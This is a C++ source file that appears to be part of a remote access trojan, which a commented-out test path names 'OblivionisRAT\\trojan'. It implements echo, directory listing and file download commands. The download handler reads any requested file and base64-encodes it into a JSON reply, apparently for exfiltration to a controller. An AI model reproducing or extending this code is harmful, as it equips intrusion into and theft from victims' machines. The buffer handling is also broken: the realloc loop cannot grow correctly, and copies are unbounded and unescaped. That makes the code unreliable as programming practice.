#include "command.hpp"

#define MSGBLANK_LEN 16


const char *jsonMsgBlank = "{\"message\": \"%s\"}";
void jsonMsg(char *msg, char *buf, int *len) {
    *len = sprintf(buf, jsonMsgBlank, msg);
}

char *commandEcho(char *args, int argsLen, int *msgLen) {
    char *msg = (char *)malloc(MSGBLANK_LEN + argsLen + 0x10);
    jsonMsg(args, msg, msgLen);
    return msg;
}

const char *noDir = "Error: No such file or directory";
#define NODIR_LEN 32
char *command_ls(char *args, int argsLen, int *msgLen) {
    DIR *dir;
    struct dirent *ent;
    struct stat st;

    char *msg = (char *)malloc(1024);
    *msgLen = 0;

    if ((dir = opendir(args)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", args, ent->d_name);
            stat(path, &st);

            char line[1024];
            int len;
            if (S_ISDIR(st.st_mode)) {
                len = snprintf(line, sizeof(line), "%-24s dir     -\n", ent->d_name);
            } else {
                len = snprintf(line, sizeof(line), "%-24s file    %lld\n", ent->d_name, (long long)st.st_size);
            }

            while (*msgLen + len >= 1024) {
                msg = (char *)realloc(msg, *msgLen * 2);
            }
            strcpy(msg + *msgLen, line);
            *msgLen += len;
        }
        closedir(dir);
    } else {
        strcpy(msg, noDir);
        *msgLen = NODIR_LEN;
    }
    char *toRet = (char *)malloc(*msgLen + MSGBLANK_LEN + 0x10);
    sprintf(toRet, jsonMsgBlank, msg);
    *msgLen += MSGBLANK_LEN;
    free(msg);
    return toRet;
}

const char *fileBlank = "{\"file\": {\"name\": \"%s\", \"content\": \"%s\"}}";
char *command_download(char *args, int argsLen, int *msgLen) {
    FILE *file;
    char *buffer;
    long fileSize;
    file = fopen(args, "rb");
    if(file == NULL) {
        buffer = (char *)malloc(MSGBLANK_LEN + 0x10 + NODIR_LEN);
        *msgLen = sprintf(buffer, jsonMsgBlank, noDir);
        return buffer;
    }
    fseek(file, 0,SEEK_END);
    fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    buffer = (char *)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    fclose(file);
    int base64Len;
    char *base64 = base64_encode((const unsigned char *)buffer, fileSize, &base64Len);
    free(buffer);
    buffer = (char *)malloc(base64Len + argsLen + 0x40);
    *msgLen = sprintf(buffer, fileBlank, args, base64);
    free(base64);
    return buffer;
}
/*
int main() {
    int len;
    char *path = (char *)"E:\\OblivionisRAT\\trojan";
    char *msg = command_ls(path, strlen(path), &len);
    for(int i = 0; i < len; i++) {
        printf("%c", msg[i]);
    }
    return 0;
}*/